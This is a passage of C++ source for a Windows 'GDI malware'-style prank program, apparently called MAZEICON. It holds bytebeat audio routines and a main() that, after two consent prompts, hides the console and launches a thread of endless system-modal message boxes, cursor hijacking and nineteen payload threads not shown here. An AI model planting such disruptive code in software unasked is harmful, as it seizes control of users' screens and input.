	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat18() {//by UltraDasher965
	int nSamplesPerSec = 8192, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t >> 1 | t >> 6 ^ t >> 8) & 127) * 2) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat19() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((cos((t ^ t >> 2) * t >> 3) * (~t >> 4)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
DWORD WINAPI fe(LPVOID lpParam)
{
	while (true)
	{
		MessageBoxA(NULL, "MAZEICON NO SKID NO AI.\r\n\\ﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲؓؓؓؓؓؓؓؓ\r\n\\ؓؓؓؓ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\r\n\\ﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓ", NULL, MB_CANCELTRYCONTINUE | MB_HELP | MB_ICONWARNING | MB_DEFBUTTON2 | MB_SYSTEMMODAL | MB_RTLREADING);
	}
	return 0;
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxW(NULL, msgboxtext, title, MB_YESNO | MB_ICONWARNING) == IDNO) { ExitProcess(0); }
	else
	{
		if (MessageBoxW(NULL, finalmsgboxtext, finaltitle, MB_YESNO | MB_ICONWARNING) == IDNO) { ExitProcess(0); }
		else
		{
			Sleep(5000);
			HANDLE thread0 = CreateThread(0, 0, CursorMoving, 0, 0, 0);
			HANDLE thread0_ = CreateThread(0, 0, fe, 0, 0, 0);
			Sleep(666);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			HANDLE thread2_num3 = CreateThread(0, 0, Payload2_num3, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			TerminateThread(thread2_num2, 0);
			CloseHandle(thread2_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3_num1 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			HANDLE thread3_num2 = CreateThread(0, 0, Payload3_num2, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3_num1, 0);
			CloseHandle(thread3_num1);
			TerminateThread(thread3_num2, 0);
			CloseHandle(thread3_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5_num1 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, Payload5_num2, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			CloseHandle(thread5_num1);
			TerminateThread(thread5_num2, 0);
			CloseHandle(thread5_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, Payload6_num2, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			CloseHandle(thread6_num1);
			TerminateThread(thread6_num2, 0);
			CloseHandle(thread6_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12_num1 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, Payload12_num2, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			CloseHandle(thread12_num1);
			TerminateThread(thread12_num2, 0);
			CloseHandle(thread12_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13_num1 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			HANDLE thread13_num2 = CreateThread(0, 0, Payload13_num2, 0, 0, 0);
			HANDLE thread13_num3 = CreateThread(0, 0, Payload13_num3, 0, 0, 0);
			HANDLE thread13_num4 = CreateThread(0, 0, Payload13_num4, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13_num1, 0);
			CloseHandle(thread13_num1);
			TerminateThread(thread13_num2, 0);
			CloseHandle(thread13_num2);
			TerminateThread(thread13_num3, 0);
			CloseHandle(thread13_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14_num1 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			HANDLE thread14_num2 = CreateThread(0, 0, Payload14_num2, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14_num1, 0);
			CloseHandle(thread14_num1);
			TerminateThread(thread14_num2, 0);
			CloseHandle(thread14_num2);
			TerminateThread(thread2_num3, 0);
			CloseHandle(thread2_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread15_num1 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			HANDLE thread15_num2 = CreateThread(0, 0, Payload15_num2, 0, 0, 0);
			HANDLE thread15_num3 = CreateThread(0, 0, Payload15_num3, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread15_num1, 0);
			CloseHandle(thread15_num1);
			TerminateThread(thread15_num2, 0);
			CloseHandle(thread15_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread16 = CreateThread(0, 0, Payload16_num1, 0, 0, 0);
			bytebeat16();
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread17_num1 = CreateThread(0, 0, Payload17_num1, 0, 0, 0);
			HANDLE thread17_num2 = CreateThread(0, 0, Payload17_num2, 0, 0, 0);
			bytebeat17();
			TerminateThread(thread17_num1, 0);
			CloseHandle(thread17_num1);
			TerminateThread(thread17_num2, 0);
			CloseHandle(thread17_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread18 = CreateThread(0, 0, Payload18_num1, 0, 0, 0);
			bytebeat18();
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread19 = CreateThread(0, 0, Payload19_num1, 0, 0, 0);
			bytebeat19();
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
			TerminateThread(thread0_, 0);
			CloseHandle(thread0_);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			TerminateThread(thread13_num4, 0);
			CloseHandle(thread13_num4);
			TerminateThread(thread15_num3, 0);
			CloseHandle(thread15_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
		}
	}
	return 0;
}